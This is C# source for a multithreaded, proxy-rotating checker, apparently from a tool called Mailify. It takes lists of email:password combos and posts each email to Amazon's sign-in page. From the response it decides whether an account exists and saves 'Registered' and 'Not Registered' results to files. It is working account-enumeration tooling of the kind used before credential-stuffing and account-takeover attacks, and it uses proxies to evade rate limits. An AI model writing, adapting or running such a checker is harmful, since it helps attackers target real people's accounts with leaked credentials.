using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Amazon_VM
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;


            new Thread(() => Variables.VM_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);

        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));


                    req.AddHeader("cookie", "skin=noskin; session-id=140-6605874-9084130; session-id-time=2082787201l; ubid-main=130-2269163-6174416;");
                    string str = $"appActionToken=Wj2FbTjxRyCm8iJHKhcdAyKci1jQYj3D&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmNvbS8%2FcmVmXz1uYXZfY3VzdHJlY19zaWduaW4%3D&prevRID=ape%3AUDFHNjNRQjdQRVRHRzlHVFpBNU4%3D&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.ed67mlCj_dg-L93dlkTvutSUmRbO8ScOffQpsl-rNS1cKK8AKkMtcA.1w8qoLdRvPhUkj4-.3IHC7BywnYhAREaU8jfSKCCOP1jN13LOlB4EM2H7cZU3yRCX3Uu8yQ9HMi-OttA61wywsd-E4kWcRV_hdQlAxIS1GbnSG1I2f2BvU-7lY4L9NND2XYqMakiarDAhf8WZxDp0pFuGCrDBKjsplw_s28I8FF5xqOVztuGAbJmnkS9dp34zivVbPS4SdrFdAqhc45nuXJq51ES3MoDelKgaTZI6uUUvma3wta_jJsYGzhz2qLmZTejXx2cJm1H1TLa6YjWBMso7L7P2BWwjBPorUawkjtGdAzt_3yf4xIObRlgdjZddClrpJDIJ_Qg1KqZF6YEGiq_Ndn_bNcy0hreXSEI-4A9fHZSjF3dAwfhc-a_vb3fc.90ckTBHjVmO6o-3sns9-sw&email={credentials[0]}&password=123&create=0";
                    string request = req.Post("https://www.amazon.com/ap/signin", str, "application/x-www-form-urlencoded").ToString();
                    if (request.Contains("We cannot find an account with that email address"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Not Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (request.Contains("To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below."))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }
                }
                 
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}